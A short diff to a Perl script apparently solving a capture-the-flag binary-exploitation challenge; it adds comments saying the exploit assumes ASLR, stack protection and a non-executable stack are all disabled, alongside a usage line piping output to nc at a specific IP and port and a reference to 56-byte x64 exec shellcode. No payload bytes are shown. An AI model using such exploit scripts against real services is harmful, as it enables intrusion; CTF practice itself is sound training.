@@ -1,6 +1,8 @@
 #!/usr/bin/perl
 #chmod +x solution.pl
 #usage ./solution.pl | nc 104.155.16.78 62123
+#solution is written for a 64-bit compiled binary with ALSR turned off
+#stack protection disabled and an executable stack enabled
 
 $| = 1;
 # linux/x64/exec - 56 bytes
